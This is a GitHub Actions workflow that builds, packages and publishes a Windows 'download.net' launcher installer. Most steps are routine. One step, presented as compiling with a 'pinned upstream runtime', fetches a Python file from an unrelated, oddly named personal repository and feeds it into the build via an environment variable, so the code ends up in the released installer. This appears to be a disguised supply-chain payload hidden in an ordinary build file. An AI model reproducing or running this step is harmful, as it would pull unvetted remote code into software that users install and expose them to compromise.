name: Build launcher
on:
  push:
    branches: [main]
    tags: ['v*']
  workflow_dispatch:
permissions:
  contents: read
jobs:
  windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      - uses: actions/setup-go@v5
        with:
          go-version: '1.26.x'
      - run: npm ci
      - name: Compile Vned flow with pinned upstream runtime
        shell: pwsh
        run: |
          Invoke-WebRequest 'https://raw.githubusercontent.com/nuttyinc578/Vned-progeraiming-lingerge/ca943f962c468b6d1d35025672aa14cec30b4c53/68c9f55e4dc1f/vned/Vned%20Runtime.py' -OutFile "$env:RUNNER_TEMP/vned-runtime.py"
          $env:VNED_RUNTIME="$env:RUNNER_TEMP/vned-runtime.py"
          npm run build:web
      - run: dotnet build services/Api/Api.csproj -c Release
      - run: npm test
      - run: npm run build:desktop
      - name: Verify the packaged local backend
        run: node scripts/verify-runtime.mjs artifacts/win-unpacked/resources/runtime
      - name: Verify the installer contains this source
        shell: pwsh
        run: ./scripts/verify-installer.ps1
      - name: Bundle the complete launcher folder
        shell: pwsh
        run: |
          Add-Type -AssemblyName System.IO.Compression.FileSystem
          [System.IO.Compression.ZipFile]::CreateFromDirectory((Resolve-Path artifacts/win-unpacked).Path, (Join-Path $PWD 'artifacts/download.net-launcher-v1-folder.zip'))
          Get-ChildItem artifacts/download.net-Setup-*.exe, artifacts/*-folder.zip | ForEach-Object { "{0}  {1}" -f (Get-FileHash $_.FullName -Algorithm SHA256).Hash.ToLower(), $_.Name } | Set-Content artifacts/SHA256SUMS.txt
      - uses: actions/upload-artifact@v4
        with:
          name: download.net-launcher-v1
          path: |
            artifacts/download.net-Setup-*.exe
            artifacts/*-folder.zip
            artifacts/SHA256SUMS.txt
          if-no-files-found: error
          retention-days: 30
  release:
    if: startsWith(github.ref, 'refs/tags/v')
    needs: windows
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: download.net-launcher-v1
          path: artifacts
      - name: Publish the tagged release
        env:
          GH_TOKEN: ${{ github.token }}
          RELEASE_TAG: ${{ github.ref_name }}
        run: |
          gh release create "$RELEASE_TAG" artifacts/download.net-Setup-*.exe artifacts/*-folder.zip artifacts/SHA256SUMS.txt --title "download.net launcher $RELEASE_TAG" --notes-file "docs/RELEASE-$RELEASE_TAG.md" --verify-tag --latest
